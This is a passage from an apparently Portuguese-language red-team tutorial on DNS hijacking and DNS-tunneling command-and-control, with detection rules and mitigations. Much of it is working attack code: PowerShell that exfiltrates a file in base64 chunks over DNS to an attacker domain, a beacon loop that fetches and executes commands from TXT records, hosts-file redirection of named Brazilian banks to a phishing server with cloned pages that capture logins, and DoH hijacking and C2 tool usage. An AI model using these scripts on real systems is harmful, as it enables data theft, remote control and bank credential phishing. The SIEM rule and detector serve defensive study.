+# session-init.pivot.sandsoncosta.com
+```
+
+### Passo 5: Interagir com a sessão
+
+```bash
+sliver > sessions
+
+ ID   Transport   Remote Address       Hostname        Username       
+==== =========== ==================== =============== ===============
+ 1    dns         192.168.1.100:53     DESKTOP-PC      admin          
+
+sliver > use 1
+[*] Active session 1 (DESKTOP-PC)
+
+sliver (DESKTOP-PC) > whoami
+desktop-pc\admin
+
+sliver (DESKTOP-PC) > pwd
+C:\Users\admin\Downloads
+```
+
+---
+
+## 🔍 Técnicas de Evasão Avançadas
+
+### 1. Domain Fronting via DNS
+
+```powershell
+# Usar domínios legítimos como "frente"
+# Servidor DNS resolve para CloudFlare, mas encaminha para C2
+$legitDomain = "cdn.cloudflare.com"
+$realC2 = "pivot.sandsoncosta.com"
+
+# Cliente resolve cdn.cloudflare.com
+# DNS malicioso responde com IP do C2
+```
+
+### 2. DNS over HTTPS (DoH) Hijacking
+
+```powershell
+# Forçar uso de DoH malicioso
+$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters"
+Set-ItemProperty -Path $regPath -Name "EnableAutoDoh" -Value 2
+Set-ItemProperty -Path $regPath -Name "DohPolicy" -Value 2
+
+# Configurar servidor DoH malicioso
+$dohPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\DohServers"
+# Adicionar servidor DoH customizado
+```
+
+### 3. Slow Drip DNS (evitar detecção por volume)
+
+```powershell
+# Em vez de 100 queries/min
+# Fazer 5 queries/min com dados fragmentados
+$data = "sensitive-data-to-exfiltrate"
+$chunks = [regex]::Matches($data, '.{1,10}')
+
+foreach ($chunk in $chunks) {
+    $query = "$($chunk.Value).session123.pivot.sandsoncosta.com"
+    Resolve-DnsName -Name $query -Server 192.168.1.50
+    Start-Sleep -Seconds 12  # 5 queries/min
+}
+```
+
+### 4. DNS Cache Poisoning (combinado com hijacking)
+
+```powershell
+# Envenenar cache DNS local antes de redirecionar
+$cacheEntries = @{
+    "google.com" = "192.168.1.50"
+    "microsoft.com" = "192.168.1.50"
+    "github.com" = "192.168.1.50"
+}
+
+foreach ($entry in $cacheEntries.GetEnumerator()) {
+    # Adicionar entrada no cache DNS
+    Add-DnsClientNrptRule -Namespace $entry.Key -NameServers $entry.Value
+}
+```
+
+---
+
+## 🛡️ Regra SIEM (Detecção Multicamadas)
+
+```yaml
+rule: wmi_dns_hijacking_with_c2_tunneling
+description: "Detecta modificação DNS via WMI e padrões de DNS tunneling"
+
+events:
+  # Layer 1: Modificação DNS via WMI
+  - event_id: 5858
+    operation: SetDNSServerSearchOrder
+    provider_name: Microsoft-Windows-WMI-Activity
+    
+  # Layer 2: Modificação DNS via Registry
+  - sysmon_event_id: 13
+    target_object_contains_any:
+      - "\\Tcpip\\Parameters\\Interfaces"
+      - "\\NameServer"
+      - "\\DhcpNameServer"
+    
+  # Layer 3: Volume anômalo de queries DNS
+  - sysmon_event_id: 22
+    query_count: > 50 (per minute)
+    
+  # Layer 4: Modificação via netsh
+  - sysmon_event_id: 1
+    image_ends_with: "\\netsh.exe"
+    command_line_contains: "interface ip set dns"
+
+correlation:
+  timeframe: 300 seconds
+  events:
+    # Queries DNS suspeitas
+    - sysmon_event_id: 22
+      query_type: [TXT, NULL, CNAME, MX]
+      query_length: > 50 characters
+      subdomain_entropy: > 3.5
+      subdomain_count: > 4
+      
+    # Conexão para DNS externo não autorizado
+    - sysmon_event_id: 3
+      destination_port: 53
+      destination_ip_not_in: [approved_dns_servers]
+      
+    # Processo suspeito gerando queries
+    - sysmon_event_id: 1
+      parent_process_not_in: [system_processes]
+      
+    # Modificação de hosts file
+    - sysmon_event_id: 11
+      target_filename_contains: "\\drivers\\etc\\hosts"
+
+enrichment:
+  - extract_dns_server_from_wmi_event
+  - check_dns_server_reputation_virustotal
+  - analyze_dns_query_patterns_ml
+  - detect_dns_tunneling_signatures
+  - check_dns_over_https_config
+  - verify_dhcp_options_tampering
+
+dns_tunneling_detection:
+  statistical_indicators:
+    - high_query_volume: > 100 queries/min
+    - long_subdomain_names: > 40 chars
+    - high_subdomain_entropy: > 3.0 (Shannon)
+    - unusual_record_types: [TXT, NULL, MX, CNAME]
+    - regular_beacon_intervals: stddev < 2 seconds
+    - unique_subdomains: > 50 per hour
+    - base64_pattern_in_subdomain: true
+    - numeric_heavy_subdomains: > 30% digits
+    
+  behavioral_indicators:
+    - dns_server_change_without_dhcp_renewal
+    - dns_queries_to_non_standard_servers
+    - high_failure_rate_on_queries: > 20%
+    - queries_from_non_browser_processes
+    - dns_queries_during_off_hours
+
+scoring:
+  base: 80
+  modifiers:
+    + dns_server_external_unknown: +20
+    + high_query_volume: +15
+    + unusual_record_types: +10
+    + high_entropy_subdomains: +15
+    + regular_intervals_detected: +10
+    + base64_encoding_detected: +12
+    + registry_persistence: +18
+    + amsi_bypass_detected: +25
+
+severity: 
+  - score < 90: MEDIUM
+  - score 90-120: HIGH
+  - score > 120: CRITICAL
+
+response_actions:
+  immediate:
+    - block_dns_server_firewall
+    - isolate_host_network
+    - capture_dns_traffic_pcap_5min
+    - snapshot_dns_cache
+    
+  investigation:
+    - restore_legitimate_dns_config
+    - analyze_dns_queries_for_exfiltration
+    - check_hosts_file_modifications
+    - review_registry_dns_keys
+    - dump_process_memory_suspicious_apps
+    
+  remediation:
+    - reset_network_stack: "netsh int ip reset"
+    - flush_dns_cache: "ipconfig /flushdns"
+    - restore_registry_backup
+    - scan_for_dns_implants
+```
+
+---
+
+## 🐍 Script Python: Análise de DNS Tunneling
+
+```python
+#!/usr/bin/env python3
+"""
+Detector de DNS Tunneling
+Analisa queries DNS capturadas para identificar padrões de C2
+"""
+
+import re
+import math
+from collections import Counter, defaultdict
+from datetime import datetime
+
+class DNSTunnelingDetector:
+    def __init__(self):
+        self.queries = []
+        self.suspicious = []
+        
+    def calculate_entropy(self, string):
+        """Calcula entropia de Shannon (medida de aleatoriedade)"""
+        if not string:
+            return 0
+        prob = [float(string.count(c)) / len(string) for c in dict.fromkeys(list(string))]
+        return -sum([p * math.log(p) / math.log(2.0) for p in prob])
+    
+    def detect_base64(self, string):
+        """Detecta padrões Base64"""
+        base64_pattern = r'^[A-Za-z0-9+/]{4,}={0,2}$'
+        return bool(re.match(base64_pattern, string))
+    
+    def analyze_query(self, query, timestamp=None):
+        """Analisa uma query individual"""
+        # Extrair subdomínios
+        parts = query.lower().split('.')
+        subdomains = parts[:-2] if len(parts) > 2 else parts
+        
+        indicators = {
+            'query': query,
+            'timestamp': timestamp or datetime.now().isoformat(),
+            'length': len(query),
+            'subdomain_count': len(subdomains),
+            'max_label_length': max(len(s) for s in parts) if parts else 0,
+            'total_entropy': self.calculate_entropy(query),
+            'subdomain_entropy': self.calculate_entropy(''.join(subdomains)),
+            'numeric_ratio': sum(c.isdigit() for c in query) / len(query) if query else 0,
+            'consonant_ratio': sum(c in 'bcdfghjklmnpqrstvwxyz' for c in query.lower()) / len(query) if query else 0,
+            'has_base64_pattern': any(self.detect_base64(s) for s in subdomains),
+            'unique_chars': len(set(query)),
+            'vowel_ratio': sum(c in 'aeiou' for c in query.lower()) / len(query) if query else 0
+        }
+        
+        return indicators
+    
+    def score_query(self, indicators):
+        """Calcula score de suspeita (0-100)"""
+        score = 0
+        reasons = []
+        
+        # Comprimento suspeito
+        if indicators['length'] > 50:
+            score += 30
+            reasons.append(f"Query muito longa ({indicators['length']} chars)")
+        
+        # Alta entropia
+        if indicators['total_entropy'] > 3.5:
+            score += 40
+            reasons.append(f"Alta entropia ({indicators['total_entropy']:.2f})")
+        
+        # Muitos subdomínios
+        if indicators['subdomain_count'] > 4:
+            score += 20
+            reasons.append(f"Muitos subdomínios ({indicators['subdomain_count']})")
+        
+        # Padrão Base64
+        if indicators['has_base64_pattern']:
+            score += 30
+            reasons.append("Padrão Base64 detectado")
+        
+        # Muitos números
+        if indicators['numeric_ratio'] > 0.3:
+            score += 15
+            reasons.append(f"Alta proporção numérica ({indicators['numeric_ratio']:.2%})")
+        
+        # Label muito longo
+        if indicators['max_label_length'] > 40:
+            score += 25
+            reasons.append(f"Label longo ({indicators['max_label_length']} chars)")
+        
+        # Baixa proporção de vogais (indica aleatoriedade)
+        if indicators['vowel_ratio'] < 0.15:
+            score += 20
+            reasons.append(f"Baixa proporção de vogais ({indicators['vowel_ratio']:.2%})")
+        
+        # Alta proporção de consoantes seguidas
+        if indicators['consonant_ratio'] > 0.7:
+            score += 15
+            reasons.append("Alta concentração de consoantes")
+        
+        indicators['score'] = min(score, 100)
+        indicators['reasons'] = reasons
+        
+        return indicators
+    
+    def detect_beaconing(self, queries_with_time):
+        """Detecta padrões de beacon regulares"""
+        if len(queries_with_time) < 3:
+            return False, 0
+        
+        # Calcular intervalos entre queries
+        intervals = []
+        for i in range(1, len(queries_with_time)):
+            t1 = datetime.fromisoformat(queries_with_time[i-1]['timestamp'])
+            t2 = datetime.fromisoformat(queries_with_time[i]['timestamp'])
+            intervals.append((t2 - t1).total_seconds())
+        
+        # Calcular desvio padrão
+        if not intervals:
+            return False, 0
+        
+        mean = sum(intervals) / len(intervals)
+        variance = sum((x - mean) ** 2 for x in intervals) / len(intervals)
+        std_dev = math.sqrt(variance)
+        
+        # Beaconing tem intervalos muito regulares (baixo desvio padrão)
+        is_beaconing = std_dev < 2 and mean < 60  # Menos de 2 segundos de variação
+        
+        return is_beaconing, std_dev
+    
+    def analyze_batch(self, queries):
+        """Analisa batch de queries e retorna suspeitas"""
+        results = []
+        domain_stats = defaultdict(list)
+        
+        for query_data in queries:
+            if isinstance(query_data, str):
+                query = query_data
+                timestamp = None
+            else:
+                query = query_data.get('query')
+                timestamp = query_data.get('timestamp')
+            
+            # Análise individual
+            indicators = self.analyze_query(query, timestamp)
+            scored = self.score_query(indicators)
+            
+            # Agrupar por domínio base
+            parts = query.split('.')
+            base_domain = '.'.join(parts[-2:]) if len(parts) >= 2 else query
+            domain_stats[base_domain].append(scored)
+            
+            if scored['score'] > 60:
+                results.append(scored)
+        
+        # Análise de beaconing por domínio
+        beaconing_domains = {}
+        for domain, domain_queries in domain_stats.items():
+            if len(domain_queries) >= 3:
+                is_beacon, std_dev = self.detect_beaconing(domain_queries)
+                if is_beacon:
+                    beaconing_domains[domain] = {
+                        'query_count': len(domain_queries),
+                        'std_dev': std_dev,
+                        'avg_score': sum(q['score'] for q in domain_queries) / len(domain_queries)
+                    }
+        
+        return {
+            'suspicious_queries': sorted(results, key=lambda x: x['score'], reverse=True),
+            'beaconing_domains': beaconing_domains,
+            'total_analyzed': len(queries),
+            'suspicious_count': len(results),
+            'unique_domains': len(domain_stats)
+        }
+
+# Exemplo de uso
+if __name__ == "__main__":
+    detector = DNSTunnelingDetector()
+    
+    # Queries de exemplo (normais vs suspeitas)
+    test_queries = [
+        "google.com",
+        "www.microsoft.com",
+        "aGVsbG8gd29ybGQ=.cmd123.pivot.sandsoncosta.com",  # Base64 + longo
+        "data-aHR0cDovL2V4YW1wbGUuY29t.session456.evil.com",
+        "normal-site.com",
+        "8j3h2k4g5h7j8k9.random.c2server.net",  # Alta entropia
+    ]
+    
+    results = detector.analyze_batch(test_queries)
+    
+    print("=" * 60)
+    print("ANÁLISE DE DNS TUNNELING")
+    print("=" * 60)
+    print(f"\nTotal analisado: {results['total_analyzed']}")
+    print(f"Queries suspeitas: {results['suspicious_count']}")
+    print(f"Domínios únicos: {results['unique_domains']}")
+    
+    if results['beaconing_domains']:
+        print(f"\n⚠️  BEACONING DETECTADO:")
+        for domain, stats in results['beaconing_domains'].items():
+            print(f"  • {domain}")
+            print(f"    - Queries: {stats['query_count']}")
+            print(f"    - Desvio padrão: {stats['std_dev']:.2f}s")
+            print(f"    - Score médio: {stats['avg_score']:.1f}/100")
+    
+    print(f"\n🔴 TOP QUERIES SUSPEITAS:\n")
+    for idx, query in enumerate(results['suspicious_queries'][:5], 1):
+        print(f"{idx}. {query['query']}")
+        print(f"   Score: {query['score']}/100")
+        print(f"   Razões:")
+        for reason in query['reasons']:
+            print(f"     • {reason}")
+        print()
+```
+
+---
+
+## 🔬 Testando a Detecção
+
+### Gerar tráfego DNS malicioso para teste
+
+```powershell
+# Script de teste (executar no lab)
+$c2Domain = "pivot.sandsoncosta.com"
+$sessionId = "sess" + (Get-Random -Maximum 9999)
+
+# Simular DNS tunneling
+1..20 | ForEach-Object {
+    $data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("test-data-$_"))
+    $query = "$data.$sessionId.$c2Domain"
+    
+    try {
+        Resolve-DnsName -Name $query -Server 192.168.1.50 -ErrorAction SilentlyContinue
+    } catch {}
+    
+    Start-Sleep -Milliseconds 500
+}
+
+Write-Host "[+] Enviadas 20 queries DNS maliciosas"
+```
+
+### Capturar e analisar com Wireshark
+
+```bash
+# Filtro Wireshark para DNS suspeito
+dns && (dns.qry.name.len > 50 || dns.resp.type == 16)
+
+# Exportar queries para análise
+tshark -r capture.pcap -Y "dns.flags.response == 0" \
+       -T fields -e dns.qry.name > dns_queries.txt
+
+# Analisar com script Python
+python3 dns_detector.py dns_queries.txt
+```
+
+---
+
+## 🧹 Limpeza e Reversão
+
+### Restaurar configuração DNS original
+
+```powershell
+# Método 1: Via WMI
+$nic = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True"
+$nic.SetDNSServerSearchOrder(@("8.8.8.8", "8.8.4.4"))
+
+# Método 2: Via Registry
+$adapter = Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1
+$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$($adapter.InterfaceGuid)"
+Remove-ItemProperty -Path $regPath -Name NameServer -ErrorAction SilentlyContinue
+Remove-ItemProperty -Path $regPath -Name DhcpNameServer -ErrorAction SilentlyContinue
+
+# Método 3: Via netsh
+netsh interface ip set dns name="Ethernet" dhcp
+
+# Limpar cache DNS
+ipconfig /flushdns
+
+# Renovar configurações DHCP
+ipconfig /renew
+```
+
+### Remover persistência
+
+```powershell
+# Remover regras NRPT (se existirem)
+Get-DnsClientNrptRule | Remove-DnsClientNrptRule -Force
+
+# Limpar hosts file
+$hostsPath = "C:\Windows\System32\drivers\etc\hosts"
+(Get-Content $hostsPath) | Where-Object {$_ -notmatch "192.168.1.50"} | Set-Content $hostsPath
+
+# Resetar pilha de rede (última opção)
+netsh int ip reset
+netsh winsock reset
+```
+
+---
+
+## 📊 Comparação de Métodos
+
+| Método | Stealth | Persistência | Complexidade | Bypass GPO | Detecção |
+|--------|---------|--------------|--------------|------------|----------|
+| WMI | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ | Difícil |
+| Registry | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐ | Média |
+| netsh | ⭐⭐ | ⭐⭐⭐⭐ | ⭐ | ⭐⭐ | Fácil |
+| hosts file | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐ | ⭐⭐⭐⭐⭐ | Fácil |
+| DHCP Options | ⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | Difícil |
+
+---
+
+## 🎭 Cenários de Ataque Reais
+
+### Cenário 1: Exfiltração via DNS Tunneling
+
+**Objetivo:** Exfiltrar arquivo de 1MB em chunks via DNS
+
+```powershell
+# Ler arquivo e converter para Base64
+$file = [IO.File]::ReadAllBytes("C:\sensitive\database.xlsx")
+$base64 = [Convert]::ToBase64String($file)
+
+# Dividir em chunks de 63 caracteres (limite DNS label)
+$chunkSize = 63
+$chunks = [regex]::Matches($base64, ".{1,$chunkSize}")
+
+$sessionId = "exfil-" + (Get-Random -Maximum 99999)
+$totalChunks = $chunks.Count
+
+# Enviar chunks via DNS
+for ($i = 0; $i -lt $chunks.Count; $i++) {
+    $chunk = $chunks[$i].Value
+    $query = "$chunk.$i-$totalChunks.$sessionId.pivot.sandsoncosta.com"
+    
+    Resolve-DnsName -Name $query -Server 192.168.1.50 -ErrorAction SilentlyContinue
+    Start-Sleep -Milliseconds 200  # Slow drip para evitar detecção
+}
+```
+
+**No servidor C2 (reconstruir arquivo):**
+```python
+import base64
+from collections import defaultdict
+
+chunks = defaultdict(str)
+
+# Processar queries DNS capturadas
+for query in dns_logs:
+    # Extrair: chunk.index-total.session.domain.com
+    parts = query.split('.')
+    chunk_data = parts[0]
+    index = int(parts[1].split('-')[0])
+    
+    chunks[index] = chunk_data
+
+# Reconstruir arquivo
+complete_base64 = ''.join(chunks[i] for i in sorted(chunks.keys()))
+file_data = base64.b64decode(complete_base64)
+
+with open('exfiltrated.xlsx', 'wb') as f:
+    f.write(file_data)
+```
+
+---
+
+### Cenário 2: Command & Control via TXT Records
+
+**No servidor DNS malicioso (configurar respostas TXT):**
+```bash
+# Arquivo de zona DNS (BIND)
+$ORIGIN pivot.sandsoncosta.com.
+cmd IN TXT "powershell -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMA..."
+beacon IN TXT "alive"
+exfil IN TXT "upload:C:\Users\*\Documents\*.docx"
+```
+
+**No implant (ler comandos via TXT):**
+```powershell
+# Loop de beacon
+while ($true) {
+    # Verificar por comandos
+    $txtRecord = Resolve-DnsName -Name "cmd.pivot.sandsoncosta.com" -Type TXT -Server 192.168.1.50
+    
+    if ($txtRecord.Strings) {
+        $command = $txtRecord.Strings
+        
+        # Decodificar e executar
+        if ($command -match "powershell -enc (.+)") {
+            $encoded = $matches[1]
+            $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
+            Invoke-Expression $decoded
+        }
+    }
+    
+    # Beacon a cada 30 segundos
+    Start-Sleep -Seconds 30
+}
+```
+
+---
+
+### Cenário 3: Phishing Redirection Attack
+
+**Objetivo:** Redirecionar tráfego de banco para site phishing
+
+```powershell
+# Hijack DNS para domínios de bancos
+$phishingTargets = @{
+    "bancodobrasil.com.br" = "192.168.1.100"  # Servidor phishing
+    "itau.com.br" = "192.168.1.100"
+    "bradesco.com.br" = "192.168.1.100"
+    "santander.com.br" = "192.168.1.100"
+}
+
+# Método 1: Via hosts file (mais simples)
+$hostsPath = "C:\Windows\System32\drivers\etc\hosts"
+foreach ($entry in $phishingTargets.GetEnumerator()) {
+    Add-Content -Path $hostsPath -Value "$($entry.Value)  $($entry.Key) www.$($entry.Key)"
+}
+
+# Método 2: Via DNS server malicioso (mais sofisticado)
+# Configurar servidor DNS para responder com IPs falsos
+```
+
+**No servidor phishing (clonar site legítimo):**
+```bash
+# Usar HTTrack para clonar site
+httrack "https://www.bancodobrasil.com.br" -O /var/www/phishing/bb
+
+# Modificar formulários para capturar credenciais
+sed -i 's|action="https://login.bb.com.br"|action="capture.php"|g' index.html
+```
+
+---
+
+## 🔧 Ferramentas Úteis
+
+### 1. DNSChef (DNS Proxy para testes)
+
+```bash
+# Instalar DNSChef
+git clone https://github.com/iphelix/dnschef.git
+cd dnschef
+
+# Redirecionar domínios específicos
+python dnschef.py --fakeip 192.168.1.50 --fakedomains pivot.sandsoncosta.com,*.evil.com
+
+# Modo stealth (responder apenas para domínios específicos)
+python dnschef.py --file dns_rules.txt
+```
+
+**Arquivo dns_rules.txt:**
+```
+# Formato: domain=IP
+pivot.sandsoncosta.com=192.168.1.50
+*.c2domain.net=192.168.1.50
+google.com=8.8.8.8  # Passar tráfego legítimo
+```
+
+---
+
+### 2. Iodine (DNS Tunneling Tool)
+
+```bash
+# No servidor (criar túnel DNS)
+sudo iodined -f -c -P mypassword 10.0.0.1 pivot.sandsoncosta.com
+
+# No cliente (conectar via túnel)
+sudo iodine -f -P mypassword pivot.sandsoncosta.com
+
+# Agora você tem IP 10.0.0.2 e pode rotear tráfego pelo DNS
+ssh user@10.0.0.1  # Via túnel DNS!
+```
+
+---
+
+### 3. dnscat2 (DNS C2 Framework)
+
+```bash
+# No servidor
+ruby dnscat2.rb pivot.sandsoncosta.com
+
+# No cliente Windows
+dnscat2-powershell.ps1 -Domain pivot.sandsoncosta.com -DNSServer 192.168.1.50
+
+# Interação
+dnscat2> session -i 1
+dnscat2> shell
+```
+
+---
+
+## 🚨 Indicadores de Comprometimento (IOCs)
+
+### Registry Keys Modificadas
+```
+HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\*\NameServer
+HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\*\DhcpNameServer
+HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableAutoDoh
+```
+
+### Processos Suspeitos
+```
+powershell.exe → SetDNSServerSearchOrder
+netsh.exe → interface ip set dns
+reg.exe → add HKLM\SYSTEM\*\Tcpip\Parameters
+wmic.exe → Win32_NetworkAdapterConfiguration
+```
+
+### Padrões de DNS Queries
+```
+- Subdomínios com > 50 caracteres
+- Alta entropia (> 3.5)
+- Queries TXT/NULL/MX frequentes
+- Intervalos regulares (beaconing)
+- Base64 em subdomínios
+- Volume > 100 queries/min para mesmo domínio
+```
+
+### Arquivos Modificados
+```
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\dns\*.db (se servidor DNS local)
+```
+
+---
+
+## 🛡️ Mitigações e Defesas
+
+### 1. Configuração de GPO (Bloquear modificações DNS)
+
+```powershell
+# Criar GPO para forçar DNS corporativo
+New-GPO -Name "Force Corporate DNS" | 
+    New-GPLink -Target "OU=Workstations,DC=company,DC=com"
+
+# Configurar DNS servers obrigatórios
+Set-GPRegistryValue -Name "Force Corporate DNS" `
+    -Key "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" `
+    -ValueName "NameServer" `
+    -Type String `
+    -Value "10.0.0.10,10.0.0.11"
+```
+
+### 2. Monitoring DNS com Sysmon
+
+```xml
+<!-- Regra Sysmon para monitorar queries DNS -->
+<Sysmon schemaversion="4.82">
+  <EventFiltering>
+    <DnsQuery onmatch="include">
+      <!-- Queries suspeitas -->
+      <QueryName condition="contains">base64</QueryName>
+      <QueryName condition="length more than">50</QueryName>
+      <QueryResults condition="contains">192.168.</QueryResults>
+    </DnsQuery>
+    
+    <RegistryEvent onmatch="include">
+      <!-- Modificações DNS no registro -->
+      <TargetObject condition="contains">Tcpip\Parameters\Interfaces</TargetObject>
+      <TargetObject condition="contains">NameServer</TargetObject>
+    </RegistryEvent>
+  </EventFiltering>
+</Sysmon>
+```
+
+### 3. DNS Firewall Rules
+
+```bash
+# Bloquear DNS para IPs não autorizados (iptables)
+iptables -A OUTPUT -p udp --dport 53 ! -d 10.0.0.10 -j DROP
+iptables -A OUTPUT -p tcp --dport 53 ! -d 10.0.0.10 -j DROP
+
+# Permitir apenas DNS corporativo
+iptables -A OUTPUT -p udp --dport 53 -d 10.0.0.10 -j ACCEPT
+```
+
+### 4. Detecção Behavioral com PowerShell
+
+```powershell
+# Script de monitoramento contínuo
+$approvedDNS = @("10.0.0.10", "10.0.0.11")
+
+while ($true) {
+    # Verificar configuração DNS atual
+    $currentDNS = (Get-DnsClientServerAddress -AddressFamily IPv4).ServerAddresses
+    
+    foreach ($dns in $currentDNS) {
+        if ($dns -notin $approvedDNS) {
+            # ALERTA: DNS não autorizado detectado!
+            Write-EventLog -LogName "Security" -Source "DNSMonitor" `
+                -EventId 9999 -EntryType Warning `
+                -Message "DNS não autorizado detectado: $dns"
+            
+            # Restaurar DNS corporativo
+            Set-DnsClientServerAddress -InterfaceAlias "Ethernet" `
+                -ServerAddresses $approvedDNS
+        }
+    }
+    
+    Start-Sleep -Seconds 60
+}
+```
+
+### 5. DNS Sinkholing
+
+```bash
+# Configurar servidor DNS para sinkhole domínios maliciosos conhecidos
+# Arquivo de zona (BIND)
+zone "pivot.sandsoncosta.com" {
+    type master;
+    file "/etc/bind/sinkhole.db";
+};
+```
+
+**sinkhole.db:**
+```
+$TTL 86400
+@   IN  SOA ns1.company.com. admin.company.com. (
+        2024011801 ; Serial
+        3600       ; Refresh
+        1800       ; Retry
+        604800     ; Expire
+        86400 )    ; Minimum TTL
+
+@   IN  NS  ns1.company.com.
+*   IN  A   127.0.0.1  ; Redirecionar tudo para localhost
+```
+
+---
+
+## 🎓 Laboratório Prático
+
+### Setup do Ambiente
+
+```bash
+# Topologia do lab:
+# [Attacker] 192.168.1.50 (DNS/C2 Server)
+# [Victim]   192.168.1.100 (Windows 10)
+# [Monitor]  192.168.1.200 (SIEM/Wireshark)
+
+# 1. Configurar servidor DNS malicioso (Attacker)
+sudo apt install dnsmasq
+
+# /etc/dnsmasq.conf
+address=/pivot.sandsoncosta.com/192.168.1.50
+address=/#/8.8.8.8  # Forward outros domínios
+
+sudo systemctl restart dnsmasq
+
+# 2. Iniciar Sliver C2
+./sliver-server
+sliver > dns --domains pivot.sandsoncosta.com
+
+# 3. Configurar captura de tráfego (Monitor)
+sudo tcpdump -i eth0 port 53 -w dns_capture.pcap
+```
+
+### Exercício 1: DNS Hijacking Básico
+
+```powershell
+# Na máquina vítima
+# 1. Verificar DNS atual
+Get-DnsClientServerAddress
+
+# 2. Modificar via WMI
+$nic = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True"
+$nic.SetDNSServerSearchOrder(@("192.168.1.50"))
+
+# 3. Testar resolução
+nslookup pivot.sandsoncosta.com
+# Deve resolver para 192.168.1.50
+
+# 4. Verificar no monitor
+# Abrir dns_capture.pcap no Wireshark
+# Filtro: dns.qry.name contains "pivot"
+```
+
+### Exercício 2: DNS Tunneling com Exfiltração
+
+```powershell
+# Criar arquivo de teste
+"SECRET DATA: Credit Card 1234-5678-9012-3456" | Out-File secret.txt
+
+# Exfiltrar via DNS
+$data = Get-Content secret.txt
+$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))
+
+# Enviar em chunks
+$chunks = [regex]::Matches($encoded, ".{1,50}")
+$chunks | ForEach-Object {
+    $query = "$($_.Value).data.pivot.sandsoncosta.com"
+    Resolve-DnsName $query -ErrorAction SilentlyContinue
+}
+
+# No monitor: analisar com script Python detector
+python3 dns_detector.py dns_capture.pcap
+```
+
+### Exercício 3: Detecção e Resposta
+
+```powershell
+# Executar detector em tempo real
+while ($true) {
+    $queries = Get-WinEvent -FilterHashtable @{
+        LogName='Microsoft-Windows-Sysmon/Operational'
+        ID=22  # DNS Query
+    } -MaxEvents 100
+    
+    foreach ($query in $queries) {
+        $domain = $query.Properties[4].Value
+        
+        # Verificar comprimento
+        if ($domain.Length -gt 50) {
+            Write-Warning "DNS suspeito: $domain"
+            
+            # Bloquear automaticamente
+            Add-DnsClientNrptRule -Namespace $domain -NameServers "127.0.0.1"
+        }
+    }
+    
+    Start-Sleep -Seconds 10
+}
+```
+
+---
+
+## 📚 Referências
+
+- **MITRE ATT&CK:** [T1557.002](https://attack.mitre.org/techniques/T1557/002/) - ARP Cache Poisoning
+- **MITRE ATT&CK:** [T1071.004](https://attack.mitre.org/techniques/T1071/004/) - DNS C2
+- **MITRE ATT&CK:** [T1048.003](https://attack.mitre.org/techniques/T1048/003/) - Exfiltration Over Alternative Protocol (DNS)
+- **DNS Tunneling Detection:** [SANS Institute](https://www.sans.org/white-papers/34152/)
+- **Sliver C2 Documentation:** [https://github.com/BishopFox/sliver](https://github.com/BishopFox/sliver)
+- **Sysmon DNS Logging:** [Microsoft Docs](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
+
+---
+
+## ⚠️ Avisos Legais
+
+**IMPORTANTE:**
+- Este conteúdo é APENAS para fins educacionais e testes em ambientes controlados
+- Modificar DNS de sistemas sem autorização é **CRIME** (Lei 12.737/2012 - Lei Carolina Dieckmann)
+- Execute APENAS em laboratórios isolados com máquinas virtuais
+- Nunca use essas técnicas em redes/sistemas de produção ou sem autorização explícita
+- O autor não se responsabiliza pelo uso indevido dessas informações
+
+---
+
+## 📝 Checklist de Segurança
+
+### Pré-Ataque (Red Team)
+- [ ] Autorização formal por escrito do cliente
+- [ ] Ambiente de lab isolado configurado
+- [ ] Backups de configurações DNS originais
+- [ ] Plano de rollback documentado
+- [ ] Coordenação com Blue Team estabelecida
+
+### Durante o Teste
+- [ ] Documentar todas as modificações realizadas
+- [ ] Monitorar impacto em sistemas adjacentes
+- [ ] Capturar evidências (screenshots, logs, PCAPs)
+- [ ] Manter comunicação com stakeholders
+
+### Pós-Ataque
+- [ ] Restaurar configurações DNS originais
+- [ ] Limpar artefatos (registry, hosts file, cache DNS)
+- [ ] Validar restauração com testes de conectividade
+- [ ] Gerar relatório técnico detalhado
+- [ ] Apresentar findings e recomendações
+
+---
+
+**🎯 Próximas Técnicas:**
+- **Técnica 8:** Port Forwarding com netsh
+- **Técnica 9:** WMI Lateral Movement
+- **Técnica 10:** NTLM Relay via responder
+
+## Detecção no SIEM
+
+### Detecção do **Passo 1** e **Passo 2**
+
+<figure style="text-align: center;">
+  <img src="image-8.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: auto;">
+  <figcaption><i><strong>Figura 10. </strong>Detecção via PowerShell.</i></figcaption>
+</figure>
+
+### Detecção do **Passo 3**
+
+<figure style="text-align: center;">
+  <img src="image-9.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: auto;">
+  <figcaption><i><strong>Figura 11. </strong>Detecção via Sysmon EID 13.</i></figcaption>
+</figure>
+
+# 🎯 Técnica 6: Registry Firewall Bypass Persistente
+
+**MITRE ATT&CK:** T1112 (Modify Registry) + T1562.004 (Disable Firewall)
+
+## O que é?
+
+Modificação direta de chaves de registro do Windows Firewall para desabilitá-lo ou criar exceções persistentes, método mais stealth que comandos netsh/PowerShell.
+
+## Como funciona?
+
+```powershell
+# Desabilitar firewall completamente
